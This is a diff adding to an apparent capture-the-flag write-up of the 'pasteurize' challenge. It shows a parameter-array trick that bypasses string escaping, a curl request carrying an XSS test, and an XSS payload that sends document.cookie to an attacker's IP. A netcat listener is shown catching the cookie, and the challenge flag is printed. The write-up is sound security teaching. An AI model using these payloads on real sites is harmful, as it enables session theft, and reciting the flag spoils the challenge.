@@ -53,9 +53,46 @@ especially
 const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
   .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
 ```
-which because the code is extended thanks to the creator allows us to use a nested array in the payload of `content` can become `content[]`
+which because the code is extended thanks to the creator allows us to use a nested array in the payload of `content` can become `content[]` so we can inject code into it with curl
 
 
+Note for obvious reasons it is recommended to never allow the post of a GET request to actually function in any meaningful way cause what is happening right now might happen to you
+```bash
+curl 'https://pasteurize.web.ctfcompetition.com/' \
+-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0' \
+-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
+-H 'Accept-Language: en-US,en;q=0.5' \
+--compressed -H 'Connection: keep-alive' \
+-H 'Upgrade-Insecure-Requests: 1' \
+-H 'Sec-GPC: 1' \
+-H 'DNT: 1' \
+-H 'If-None-Match: W/"2e4-f6rsMDbli7YmLKw6n/omsAXDVO4"' \
+-H 'Cache-Control: max-age=0' -H 'TE: Trailers' -d "content[]=;alert(1);"
+```
+To get this little curl command I used Firefox's `Inspect Element` option and went to the `network` tab and copied the get request as a `cURL` or you can `Edit and Resend` if you are not using Linux, cause WebInvoke does not like this style of formating in Windows.
+![image tooltip here](/images/fire_get.png)
 
+At this point we can inject a piece of code to allow 
+
+`content[;document.getElementById('note-content').innerHTML='<img src=http://<YOUR IP ADDRESS>:1337?c='%2bdocument.cookie%2b'>';exit();//]=pwnd`
+
+opening a netcat commannd and listen for them to respond
+
+```bash
+nc -lvnp 1337
+Connection from 104.155.55.51:40640
+GET /?c=secret=CTF{Express_t0_Tr0ubl3s}
+Pragma: no-cache
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Host: 1.2.3.4:1337
+Via: 1.1 infra-squid (squid/3.5.27)
+X-Forwarded-For: 34.78.209.239
+Cache-Control: no-cache
+Connection:keep-alive
+```
+bada bing bada boom we're done. Also make sure your router is directing traffic properly for this to work cause netcats only looks at what you direct to it
+
+`CTF{Express_t0_Tr0ubl3s}`
 
 
